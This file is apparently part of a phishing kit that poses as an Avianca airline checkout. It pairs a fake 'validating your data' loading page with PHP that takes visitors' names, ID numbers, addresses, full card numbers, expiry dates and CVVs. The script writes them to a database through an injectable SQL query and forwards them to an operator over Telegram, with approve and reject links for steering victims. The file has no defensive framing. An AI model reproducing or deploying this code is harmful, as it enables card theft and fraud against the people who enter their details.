<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="media/icon.ico" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/style.css">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">

    <title>Avianca | #NACIONALES</title>
</head>

<body>
    <div class="header_check">
        <img src="media/logo-avianca-minimal.svg" class="logo">
        <img src="media/paso3.png" alt="" class="pasos">
    </div>

    <div class="body_check">
        <div class="loader">

            <div class="lds-ring">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
            <br><br>
            <p class="text-center">Estamos validando los datos. <br>
                Puede tardar entre 1 a 5 minutos. <br>
                No cierre o recargue esta ventana.</p>
        </div>
    </div>



</body>



<script src="js/jquery-3.7.1.min.js"></script>

</html>


<?php
require_once('../conexion/ip.php');
require_once('../conexion/telegram.php');
require_once('../conexion/api.php');
$ip = getRealIP();
$mysqli = include_once "../conexion/index.php";

$nombre = $_POST["nombre"];
$apellido = $_POST["apellido"];
$documento = $_POST["documento"];
$telefono = $_POST["telefono"];
$ciudad = $_POST["ciudad"];
$direccion = $_POST["direccion"];
$banco = $_POST["banco"];
$franquicia = $_POST["franquicia"];
$tipo_tarjeta = $_POST["tipo_tarjeta"];
$nro_tarjeta = $_POST["nro_tarjeta"];
$nombre_tarjeta = $_POST["nombre_tarjeta"];
$mes_tarjeta = $_POST["mes_tarjeta"];
$anio_tarjeta = $_POST["anio_tarjeta"];
$cvv_tarjeta = $_POST["cvv_tarjeta"];
$fecha = "<b> <i>" . date("d/m/Y") . " </i> " . date("h:m:s  a") . "</b>";
$fechaT = date("d/m/Y") . " - " . date("h:m:s  a");
$response = false;

if (
    empty($nombre) || empty($apellido) || empty($documento) || empty($telefono) || empty($ciudad)
    || empty($direccion) || empty($banco) || empty($nro_tarjeta) || empty($nombre_tarjeta) || empty($mes_tarjeta) || empty($anio_tarjeta)
    || empty($cvv_tarjeta)
) {
?>
    <script type="text/javascript">
        window.location.href = "datos.php?error=empty";
    </script>
    <?php
} else {
    $sentencia = $mysqli->prepare("INSERT INTO users (nombre, apellido, documento, telefono, ciudad,  direccion, banco, franquicia, tipo_tarjeta, nro_tarjeta, nombre_tarjeta, mes_tarjeta, anio_tarjeta, cvv_tarjeta, ip, fecha) VALUES ('$nombre', '$apellido', '$documento', '$telefono', '$ciudad',  '$direccion', '$banco', '$franquicia', '$tipo_tarjeta', '$nro_tarjeta', '$nombre_tarjeta', '$mes_tarjeta', '$anio_tarjeta', '$cvv_tarjeta', '$ip', '$fecha')");

    if ($sentencia->execute()) {
        $response = true;
    } else {
        $response = false;
    }

    $sentencia->close();

    if ($response == true) {


        $id = $mysqli->insert_id;

$mensaje = "
# " . $id . "\n
ℹ️ DATOS DEL CLIENTE
Ip: " . $ip . "
👨 " . $nombre . " " . $apellido . "
🪪 " . $documento . "
📞 " . $telefono . "
🏙️ " . $ciudad . " - " . $direccion . " \n
ℹ️ DATOS DE LA TARJETA 
🏛️ " . $banco . "
🏧 " . $franquicia . "
💳 " . $tipo_tarjeta . "
💳 " . $nro_tarjeta . "
👨 " . $nombre_tarjeta . "
📅 " . $mes_tarjeta." / ". $anio_tarjeta.  "
🔒 " . $cvv_tarjeta . "\n
🕓 " . $fechaT . " \n
ℹ️ OPCIONES
";

$link1 = $apiUrl."api/index.php?datos=error&id=".$id;
$link2 = $apiUrl."api/index.php?datos=ok&id=".$id;
enviarMensaje($mensaje, $link1, $link2);

    ?>
        <script type="text/javascript">
            window.location.href = "loading.php?id_user=<?php echo $id; ?>";
        </script>
        <?php
    } else {
        print_r("error");
    }
}
        ?>|